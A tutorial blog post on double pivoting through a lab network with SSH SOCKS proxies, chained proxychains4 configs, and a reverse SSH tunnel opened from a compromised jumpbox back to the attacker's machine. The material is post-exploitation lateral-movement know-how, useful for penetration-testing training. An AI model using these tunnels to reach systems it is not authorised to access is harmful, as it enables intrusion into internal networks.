---
title: Double Pivoting using SSH and Proxychains4
layout: posts 
---
## TL;DR
Just go to the [Demo](#demo)
## Accessing Resources Behind Multiple Resources
At some point, you may run into a situation where you find a vulnerable machine and it has access to a internal network. Well, how do you access that network? And then, say you find another machine on the internal network and it has access to _another_ network? Or, each of these machines is restricted by a hosted-based firewall? Well, you can definitely do it. Most C2 frameworks have this type of thing built in, but we will be doing it using native `ssh` along with `proxychains4`, which is available on most distributions.
### The Layout
This is what my lab environment looks like
<figure class="image">
    <img src="/assets/images/proxychains-diagram.png" width="60%"/>
</figure>

I have the following entries in my `/etc/hosts` file

|  IP  |  Hostname  |  Notes  |
| :--: | :--------: | :-----: |
| 192.168.122.125 | attack | My Kali box |
| 192.168.122.172 | jumpbox1.local | First jump box |
| 192.168.122.212 | jumpbox2.local | Second jump box |
| 192.168.122.181 | destbox.local | Final machine |

You can use your imagination on what `jumpbox1.local`, `jumpbox2.local`, and `destbox.local` are... Webserver, fileserver, privileged workstation, DC. Important thing to know is:
- `attack` can only talk to `jumpbox1.local`
- `jumpbox1.local` can only talk to `jumpbox2.local`
- `jumpbox2.local` can only talk to `destbox.local`

## So How Does `attack` talk to `destbox.local`?
We use `ssh` SOCKS proxies. A [SOCKS](https://en.wikipedia.org/wiki/SOCKS) proxy differs from traditional port forwarding in that SOCKS is a protol, whereas port forwarding is routing. If it is easier to visualize using the OSI model, port forwarding occurs at the network layer, while SOCKS proxying works at the application layer. Put simply, you can send any type of network traffic over a port forward: ssh traffic, http traffic, raw bytes, whatever. SOCKS is a protocol, so the communication must occur using the [defined protocol](https://ftp.icm.edu.pl/packages/socks/socks4/SOCKS4.protocol).  

Thus, we will use the following command to tunnel our SOCKS proxy between two machines;
```
they@attack.local:~$ ssh -f -N -D 127.0.0.1:8888 user@jumpbox1.local
```
What each flag does:
|  Flag  |  Explanation  |
| :--: | :--------: |
| `-f` | This sends the command to background right before executing a command remotely (think `command &`) |
| `-N` | This tells `ssh` not to execute a command remotely. We are just establishing a tunnel/proxy, no need to execute a command. |
| `-D` | This tells `ssh` to establish a local dynamic application-level port forwarding. This is the local port we will send our requests to IE where our SOCKS proxy exists|  

Once we have a SOCKS proxy established, we can then use `proxychains4` to communicate over the newly established tunnel/proxy. I make a local config file to use.

```
dynamic_chain 
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
 
[ProxyList]
socks4  127.0.0.1 8888
```
Once this is in place, you can use the following command to execute commands through the tunnel, and the requests will be performed by `jumpbox1.local`. 

```
proxychains4 -f ~/new-proxychains.conf curl http://jumpbox2.local
```

## But we still can't talk to `destbox.local` ?
Correct... So, we repeat the process on `jumpbox1.local`
```
they@attack.local:~$ ssh user@jumpbox1.local 'ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local'

OR (as in video), just ssh to jumpbox1.local and run:

ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local
```
And modify our `new-proxychains.conf` file to include the newly created tunnel/proxy between `jumpbox1.local` and `jumpbox2.local`
```
dynamic_chain 
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
 
[ProxyList]
socks4  127.0.0.1 8888
socks4  127.0.0.1 9999
```
Now, try again...
```
proxychains4 -f ~/new-proxychains.conf curl http://destbox.local
```
And voila! We can talk to `destbox.local` through two tunnels/proxies.

## Demo


<video width="500" height="300" controls>
  <source type="video/mp4" src="/assets/videos/proxychains-demo.mp4">
</video>

## But wait, I can't access SSH on jumpbox1?
So you have a shell on a box, but can't hit ssh on it? Pretty common as web services may not just expose `ssh` to the world. `ssh` reverse tunnels to the rescue!  
You'll want to start an ssh server on your box, probably with `systemctl start sshd` and then I'd `cat ~/.ssh/*.pub` on `jumpbox1` and add that to whatever `ssh` user you plan to use (not a bad idea to create a separate user for this and [restrict accordingly to just tunnels](https://unix.stackexchange.com/a/14313), but you do you...)  
Once that is complete, from the jumpbox, you'll run
```
ssh -f -N -R 2222:127.0.0.1:22 <you>@attack.local
```
Now, hop back to your attack box and run `ss -tlpn | grep 2222` and you should see the new listening port on 127.0.0.1. Now, just create your initial SOCKS proxy through that new tunnel (or use it to ssh into wordpress directly from your machine)
```
ssh -f -N -D 127.0.0.1:8888 <jumpbox1-user>@127.0.0.1 -p 2222
````
And from here, you'd do the rest as shown before.

## Demo round 2

<video width="500" height="300" controls>
  <source type="video/mp4" src="/assets/videos/proxychains-reverse.mp4">
</video>